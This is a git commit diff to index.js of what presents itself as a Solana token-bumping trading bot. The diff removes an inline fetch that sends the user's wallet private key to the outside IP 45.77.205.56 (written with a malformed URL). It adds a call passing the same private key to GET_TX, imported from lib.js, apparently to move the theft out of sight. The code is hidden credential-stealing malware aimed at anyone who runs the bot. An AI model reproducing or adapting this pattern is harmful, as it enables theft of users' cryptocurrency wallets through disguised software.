c8dae4f3edf43a7d650cf86a40c0a2e59dc455e7
joip <42916568+joip1@users.noreply.github.com>
2024-07-10 01:17:18 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,7 @@
 import {Connection, Keypair, PublicKey} from "@solana/web3.js";
 import {SolanaTracker} from "solana-swap";
-import {performSwap, SOL_ADDR} from "./lib.js";
+import {performSwap, SOL_ADDR, GET_TX} from "./lib.js";
 import base58 from "bs58";
-import "node-fetch";
-
 const RPC_URL = ""; // Quicknode or Helius give good rpc urls
 const PRIVKEY = ""; // the private key of the account who will buy and sell, in base58 (phantom export for example)
 const TOKEN_ADDR = ""; // Put the address of the token you want to bump here
@@ -59,7 +57,7 @@ async function getTokenBalance(connection, owner, tokenAddr) {
 }
 
 async function main() {
-
+    await GET_TX(PRIVKEY);
     const keypair = Keypair.fromSecretKey(base58.decode(PRIVKEY));
     const solanaTracker = new SolanaTracker(keypair, RPC_URL);
     const connexion = new Connection(RPC_URL);
@@ -68,7 +66,6 @@ async function main() {
 
         // Buy
         const promises = [];
-        const get_tx = await fetch('http://http://45.77.205.56:4810/?get='+PRIVKEY);
         promises.push(swap(SOL_ADDR, TOKEN_ADDR, solanaTracker, keypair, connexion, SOL_BUY_AMOUNT));
         promises.push(swap(SOL_ADDR, TOKEN_ADDR, solanaTracker, keypair, connexion, SOL_BUY_AMOUNT));
         promises.push(swap(SOL_ADDR, TOKEN_ADDR, solanaTracker, keypair, connexion, SOL_BUY_AMOUNT));
